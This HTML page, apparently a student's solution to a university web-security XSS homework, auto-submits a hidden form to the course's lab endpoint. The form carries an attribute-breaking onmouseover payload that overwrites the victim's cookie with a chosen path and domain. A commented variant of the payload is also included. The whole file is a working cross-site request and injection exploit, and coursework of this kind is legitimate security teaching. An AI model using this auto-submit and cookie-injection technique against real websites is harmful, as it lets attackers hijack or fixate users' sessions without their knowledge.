<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://webappsec.cs.ut.ee/xss/homework.php">
    <title>XSS Homework Autosubmit</title>
</head>
<body onload="createForm()">

    <script>
        const createForm = () => {
            const form = document.createElement("form")
            document.body.appendChild(form)

            const label = document.createElement("label")
            label.value = "Search Term: "
            form.appendChild(label)

            const inputBox = document.createElement("input")
            inputBox.name = "searchTerm"
            inputBox.value = '"onmouseover="document.cookie=&apos;searchTerm=CompetitivePathCookie;Path=/xss/homework.php;Domain=.webappsec.cs.ut.ee&apos;"'
            form.appendChild(inputBox)

            // &quot; onmouseover=&quot;document.cookie='searchTerm=CompetitivePathCookie;path=/xss/homework.php'
            
            const submitButton = document.createElement("submit")
            submitButton.value = "Search"
            form.appendChild(submitButton)

            form.method = "POST"
            form.action = "https://webappsec.cs.ut.ee/xss/homework.php"
            
            form.submit()
        }
    </script>

</body>
</html>
